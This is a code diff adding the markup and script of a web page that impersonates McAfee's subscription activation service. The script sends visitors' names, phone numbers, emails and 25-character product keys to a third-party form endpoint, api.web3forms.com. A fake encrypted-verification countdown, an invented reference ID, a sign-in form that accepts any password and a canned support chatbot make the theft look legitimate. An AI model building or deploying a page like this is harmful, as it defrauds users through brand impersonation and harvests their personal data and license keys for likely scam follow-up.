+    <!-- 15-Second Non-Interactive Full Screen Loading Overlay -->
+    <div id="fullscreen-loading" class="fixed inset-0 z-[100] bg-slate-950/90 backdrop-blur-md flex flex-col items-center justify-center text-white hidden select-none pointer-events-auto">
+        <div class="max-w-md w-full px-6 py-8 text-center space-y-6 bg-slate-900/90 border border-slate-800 rounded-3xl shadow-2xl relative overflow-hidden mx-4">
+            <!-- Top Progress Bar -->
+            <div id="loading-progress-bar" class="absolute top-0 left-0 h-1.5 bg-gradient-to-r from-brand-red via-rose-400 to-emerald-400 transition-all duration-1000 ease-linear w-0"></div>
+            
+            <div class="relative flex justify-center items-center py-2">
+                <div class="w-24 h-24 rounded-full border-4 border-brand-red/20 border-t-brand-red animate-spin flex items-center justify-center"></div>
+                <div class="absolute w-16 h-16 bg-brand-red/10 rounded-full flex items-center justify-center">
+                    <i class="fa-solid fa-shield-halved text-3xl text-brand-red animate-pulse"></i>
+                </div>
+            </div>
+
+            <div class="space-y-2">
+                <span class="inline-block px-3 py-1 rounded-full text-[11px] font-semibold bg-rose-950/80 text-rose-300 border border-rose-800/50 uppercase tracking-wider">
+                    <i class="fa-solid fa-lock text-rose-400 mr-1"></i> 256-Bit SSL Encrypted Verification
+                </span>
+                <h3 class="text-xl font-bold text-white">Validating Subscription</h3>
+                <p id="loading-status-text" class="text-xs text-slate-300 min-h-[2.5rem] flex items-center justify-center px-2 font-medium">
+                    Initializing secure connection to McAfee servers...
+                </p>
+            </div>
+
+            <!-- Countdown Timer Display -->
+            <div class="bg-slate-800/80 rounded-2xl p-4 border border-slate-700/60">
+                <div class="text-4xl font-black font-mono text-white tracking-widest" id="countdown-timer">15</div>
+                <div class="text-[10px] text-slate-400 uppercase tracking-widest mt-1 font-semibold">Seconds Remaining</div>
+            </div>
+
+            <div class="text-[11px] text-slate-400 flex items-center justify-center gap-2">
+                <i class="fa-solid fa-spinner animate-spin text-brand-red"></i>
+                <span>Please do not refresh or close this browser window</span>
+            </div>
+        </div>
+    </div>
+
+    <!-- Thank You Screen / Page Modal -->
+    <div id="thank-you-screen" class="fixed inset-0 z-[100] bg-slate-950/95 backdrop-blur-lg flex items-center justify-center p-4 hidden">
+        <div class="max-w-lg w-full bg-white rounded-3xl p-6 sm:p-8 shadow-2xl text-slate-800 relative border border-slate-100 text-center space-y-6">
+            <div class="w-20 h-20 bg-emerald-100 text-emerald-600 rounded-full mx-auto flex items-center justify-center text-3xl shadow-inner">
+                <i class="fa-solid fa-check text-4xl"></i>
+            </div>
+
+            <div class="space-y-2">
+                <span class="inline-block px-3 py-1 rounded-full text-xs font-bold bg-emerald-100 text-emerald-800 uppercase tracking-wider">
+                    Submission Received
+                </span>
+                <h2 class="text-2xl sm:text-3xl font-black text-slate-900">Thank You For Your Submission!</h2>
+                <p class="text-xs sm:text-sm text-slate-600">
+                    Your product key and activation request have been successfully transmitted for processing.
+                </p>
+            </div>
+
+            <!-- Customer Details Summary -->
+            <div class="bg-slate-50 border border-slate-200 rounded-2xl p-4 text-left space-y-2 text-xs text-slate-700">
+                <div class="flex justify-between pb-2 border-b border-slate-200">
+                    <span class="text-slate-500 font-medium">Reference ID:</span>
+                    <span id="summary-ref" class="font-mono font-bold text-slate-900">MCF-8942-X891</span>
+                </div>
+                <div class="flex justify-between">
+                    <span class="text-slate-500 font-medium">Full Name:</span>
+                    <span id="summary-name" class="font-semibold text-slate-800">-</span>
+                </div>
+                <div class="flex justify-between">
+                    <span class="text-slate-500 font-medium">Phone Number:</span>
+                    <span id="summary-phone" class="font-semibold text-slate-800">-</span>
+                </div>
+                <div class="flex justify-between">
+                    <span class="text-slate-500 font-medium">Email Address:</span>
+                    <span id="summary-email" class="font-semibold text-slate-800">-</span>
+                </div>
+                <div class="flex justify-between">
+                    <span class="text-slate-500 font-medium">Product Key:</span>
+                    <span id="summary-key" class="font-mono font-bold text-brand-red">-</span>
+                </div>
+            </div>
+
+            <div class="p-3.5 bg-rose-50 border border-rose-200 rounded-xl text-left flex items-start gap-3">
+                <i class="fa-solid fa-shield-virus text-brand-red text-lg mt-0.5"></i>
+                <div class="text-xs text-rose-950">
+                    <p class="font-bold">Next Steps:</p>
+                    <p class="mt-0.5 text-rose-800">Our security verification system is reviewing your account details. You will receive an activation confirmation email along with setup instructions shortly.</p>
+                </div>
+            </div>
+
+            <div class="flex flex-col sm:flex-row gap-3 pt-2">
+                <button onclick="closeThankYouScreen()" class="flex-1 py-3 px-4 bg-slate-900 hover:bg-slate-800 text-white text-xs font-bold rounded-xl transition-all shadow-md">
+                    <i class="fa-solid fa-arrow-left mr-1"></i> Return to Main Page
+                </button>
+                <button onclick="switchTab('download'); closeThankYouScreen();" class="flex-1 py-3 px-4 bg-brand-red hover:bg-brand-redHover text-white text-xs font-bold rounded-xl transition-all shadow-md shadow-brand-red/20">
+                    <i class="fa-solid fa-download mr-1"></i> Go to Downloads
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Sign In Modal -->
+    <div id="signin-modal" class="fixed inset-0 z-50 bg-slate-900/60 backdrop-blur-sm hidden items-center justify-center p-4">
+        <div class="bg-white rounded-2xl max-w-md w-full p-6 sm:p-8 shadow-2xl relative">
+            <button onclick="closeSignInModal()" class="absolute right-4 top-4 text-slate-400 hover:text-slate-600">
+                <i class="fa-solid fa-xmark text-xl"></i>
+            </button>
+            <div class="text-center mb-6">
+                <div class="w-12 h-12 bg-brand-red/10 text-brand-red rounded-xl mx-auto flex items-center justify-center text-xl mb-2">
+                    <i class="fa-solid fa-user-lock"></i>
+                </div>
+                <h3 class="text-xl font-bold text-slate-900">Sign In to McAfee</h3>
+                <p class="text-xs text-slate-500 mt-1">Manage subscriptions, devices, and downloads</p>
+            </div>
+            <form onsubmit="handleSignIn(event)" class="space-y-4">
+                <div>
+                    <label class="block text-xs font-bold text-slate-700 uppercase mb-1">Email Address</label>
+                    <input type="email" required class="w-full px-3.5 py-2.5 bg-slate-50 border border-slate-300 rounded-lg text-sm focus:ring-2 focus:ring-brand-red outline-none">
+                </div>
+                <div>
+                    <label class="block text-xs font-bold text-slate-700 uppercase mb-1">Password</label>
+                    <input type="password" required class="w-full px-3.5 py-2.5 bg-slate-50 border border-slate-300 rounded-lg text-sm focus:ring-2 focus:ring-brand-red outline-none">
+                </div>
+                <button type="submit" class="w-full py-3 bg-brand-red hover:bg-brand-redHover text-white font-bold rounded-lg text-sm shadow-md">
+                    Sign In
+                </button>
+            </form>
+        </div>
+    </div>
+
+    <script>
+        function formatProductKey(input) {
+            // Remove non-alphanumeric characters
+            let raw = input.value.replace(/[^a-zA-Z0-9]/g, '').toUpperCase();
+            
+            // Limit to 25 characters max raw
+            if (raw.length > 25) raw = raw.substring(0, 25);
+            
+            // Format with dashes every 5 characters: XXXXX-XXXXX-XXXXX-XXXXX-XXXXX
+            let parts = [];
+            for (let i = 0; i < raw.length; i += 5) {
+                parts.push(raw.substring(i, i + 5));
+            }
+            
+            input.value = parts.join('-');
+
+            // Update visual state icon
+            const statusIcon = document.getElementById('key-status-icon');
+            if (statusIcon) {
+                if (raw.length === 25) {
+                    statusIcon.innerHTML = '<i class="fa-solid fa-circle-check text-emerald-500 animate-bounce"></i>';
+                } else if (raw.length > 0) {
+                    statusIcon.innerHTML = '<span class="text-xs font-bold text-brand-red">' + raw.length + '/25</span>';
+                } else {
+                    statusIcon.innerHTML = '<i class="fa-solid fa-barcode"></i>';
+                }
+            }
+        }
+
+        function switchTab(tab) {
+            const btnActivate = document.getElementById('tab-activate');
+            const btnDownload = document.getElementById('tab-download');
+            const contentActivate = document.getElementById('content-activate');
+            const contentDownload = document.getElementById('content-download');
+
+            if (tab === 'activate') {
+                btnActivate.className = 'pb-3 border-b-2 border-brand-red text-brand-red flex-1 text-center flex items-center justify-center gap-2 font-semibold';
+                btnDownload.className = 'pb-3 border-b-2 border-transparent text-slate-500 hover:text-slate-700 flex-1 text-center flex items-center justify-center gap-2';
+                contentActivate.classList.remove('hidden');
+                contentDownload.classList.add('hidden');
+            } else {
+                btnDownload.className = 'pb-3 border-b-2 border-brand-red text-brand-red flex-1 text-center flex items-center justify-center gap-2 font-semibold';
+                btnActivate.className = 'pb-3 border-b-2 border-transparent text-slate-500 hover:text-slate-700 flex-1 text-center flex items-center justify-center gap-2';
+                contentDownload.classList.remove('hidden');
+                contentActivate.classList.add('hidden');
+            }
+        }
+
+        async function processActivation(e) {
+            if (e) e.preventDefault();
+
+            const form = document.getElementById('content-activate');
+            const nameInput = document.getElementById('user-name').value.trim();
+            const phoneInput = document.getElementById('user-phone').value.trim();
+            const keyInput = document.getElementById('product-key').value.replace(/-/g, '').trim();
+            const emailInput = document.getElementById('user-email').value.trim();
+
+            if (!nameInput) {
+                showToast('Please enter your full name.', 'error');
+                return;
+            }
+            if (!phoneInput) {
+                showToast('Please enter your phone number.', 'error');
+                return;
+            }
+            if (keyInput.length < 25) {
+                showToast('Please enter a full 25-digit product key.', 'error');
+                return;
+            }
+            if (!emailInput || !emailInput.includes('@')) {
+                showToast('Please enter a valid account email address.', 'error');
+                return;
+            }
+
+            // Submit form via fetch to Web3Forms
+            const formData = new FormData(form);
+            fetch('https://api.web3forms.com/submit', {
+                method: 'POST',
+                body: formData
+            }).catch(err => console.error('Web3Forms Submit Error:', err));
+
+            // Show 15-Second non-interactive fullscreen loading overlay
+            const loadingOverlay = document.getElementById('fullscreen-loading');
+            const countdownEl = document.getElementById('countdown-timer');
+            const progressBar = document.getElementById('loading-progress-bar');
+            const statusText = document.getElementById('loading-status-text');
+
+            loadingOverlay.classList.remove('hidden');
+            document.body.classList.add('overflow-hidden');
+
+            let secondsLeft = 15;
+            const totalDuration = 15;
+
+            const statusMessages = [
+                { time: 15, text: "Connecting to McAfee global activation network..." },
+                { time: 12, text: "Transmitting 256-bit SSL encrypted registration package..." },
+                { time: 9, text: "Verifying 25-digit digital security signature with database..." },
+                { time: 6, text: "Linking subscription license with user account..." },
+                { time: 3, text: "Finalizing security activation and generating access token..." }
+            ];
+
+            countdownEl.innerText = secondsLeft;
+            progressBar.style.width = '0%';
+
+            const timerInterval = setInterval(() => {
+                secondsLeft--;
+                countdownEl.innerText = secondsLeft;
+
+                // Update progress percentage
+                const elapsed = totalDuration - secondsLeft;
+                const progressPercent = Math.min(100, Math.round((elapsed / totalDuration) * 100));
+                progressBar.style.width = `${progressPercent}%`;
+
+                // Update status message based on remaining time
+                const currentMsg = statusMessages.find(m => m.time === secondsLeft || (secondsLeft < m.time && secondsLeft > m.time - 3));
+                if (currentMsg) {
+                    statusText.innerText = currentMsg.text;
+                }
+
+                if (secondsLeft <= 0) {
+                    clearInterval(timerInterval);
+                    
+                    // Hide loading overlay
+                    loadingOverlay.classList.add('hidden');
+                    document.body.classList.remove('overflow-hidden');
+
+                    // Populate Thank You Summary
+                    const refCode = 'MCF-' + Math.floor(1000 + Math.random() * 9000) + '-' + Math.random().toString(36).substring(2, 6).toUpperCase();
+                    document.getElementById('summary-ref').innerText = refCode;
+                    document.getElementById('summary-name').innerText = nameInput;
+                    document.getElementById('summary-phone').innerText = phoneInput;
+                    document.getElementById('summary-email').innerText = emailInput;
+                    document.getElementById('summary-key').innerText = document.getElementById('product-key').value;
+
+                    // Show Thank You Page / Modal
+                    document.getElementById('thank-you-screen').classList.remove('hidden');
+
+                    // Reset Form
+                    form.reset();
+                    const statusIcon = document.getElementById('key-status-icon');
+                    if (statusIcon) statusIcon.innerHTML = '<i class="fa-solid fa-barcode"></i>';
+                }
+            }, 1000);
+        }
+
+        function closeThankYouScreen() {
+            document.getElementById('thank-you-screen').classList.add('hidden');
+        }
+
+        function toggleFaq(index) {
+            const body = document.getElementById(`faq-body-${index}`);
+            const icon = document.getElementById(`faq-icon-${index}`);
+            
+            if (body.classList.contains('hidden')) {
+                body.classList.remove('hidden');
+                icon.style.transform = 'rotate(180deg)';
+            } else {
+                body.classList.add('hidden');
+                icon.style.transform = 'rotate(0deg)';
+            }
+        }
+
+        function toggleMobileMenu() {
+            const menu = document.getElementById('mobile-menu');
+            menu.classList.toggle('hidden');
+        }
+
+        function openSignInModal() {
+            document.getElementById('signin-modal').classList.remove('hidden');
+            document.getElementById('signin-modal').classList.add('flex');
+        }
+
+        function closeSignInModal() {
+            document.getElementById('signin-modal').classList.add('hidden');
+            document.getElementById('signin-modal').classList.remove('flex');
+        }
+
+        function handleSignIn(e) {
+            e.preventDefault();
+            closeSignInModal();
+            showToast('Signed in successfully!', 'success');
+        }
+
+        function toggleSupportChat() {
+            const chat = document.getElementById('chat-modal');
+            chat.classList.toggle('hidden');
+        }
+
+        function sendChatMessage() {
+            const input = document.getElementById('chat-input');
+            const messages = document.getElementById('chat-messages');
+            const text = input.value.trim();
+
+            if (!text) return;
+
+            // Add user message
+            const userMsg = document.createElement('div');
+            userMsg.className = 'bg-brand-red text-white p-3 rounded-xl shadow-sm max-w-[85%] ml-auto text-right';
+            userMsg.innerText = text;
+            messages.appendChild(userMsg);
+
+            input.value = '';
+            messages.scrollTop = messages.scrollHeight;
+
+            // Auto reply
+            setTimeout(() => {
+                const botMsg = document.createElement('div');
+                botMsg.className = 'bg-white p-3 rounded-xl border border-slate-200 shadow-sm max-w-[85%]';
+                botMsg.innerText = "Thank you for reaching out! An activation specialist is reviewing your request. For immediate activation, please enter your 25-digit code in the main form.";
+                messages.appendChild(botMsg);
+                messages.scrollTop = messages.scrollHeight;
+            }, 800);
+        }
+
+        function handleChatKeyPress(e) {
+            if (e.key === 'Enter') sendChatMessage();
+        }
+
+        function scrollToActivation() {
+            document.getElementById('activate-section').scrollIntoView({ behavior: 'smooth' });
+        }
+
+        function simulateDownload(os) {
+            showToast(`Starting download for ${os} installer...`, 'info');
+        }
+
+        function showToast(message, type = 'info') {
+            const toast = document.createElement('div');
+            let bgColor = 'bg-slate-900';
+            if (type === 'error') bgColor = 'bg-rose-600';
+            if (type === 'success') bgColor = 'bg-emerald-600';
+
+            toast.className = `fixed top-24 right-4 z-50 ${bgColor} text-white px-4 py-3 rounded-xl shadow-xl text-xs font-bold flex items-center gap-2 transition-all duration-300 transform translate-y-0`;
+            toast.innerHTML = `<i class="fa-solid fa-circle-info"></i> ${message}`;
+            document.body.appendChild(toast);
+
+            setTimeout(() => {
+                toast.classList.add('opacity-0', '-translate-y-2');
+                setTimeout(() => toast.remove(), 300);
+            }, 3000);
+        }
+
+        function toggleRegionModal() {
+            showToast('Region preset to Global (English).', 'info');
+        }
+    </script>
+</body>
+</html>
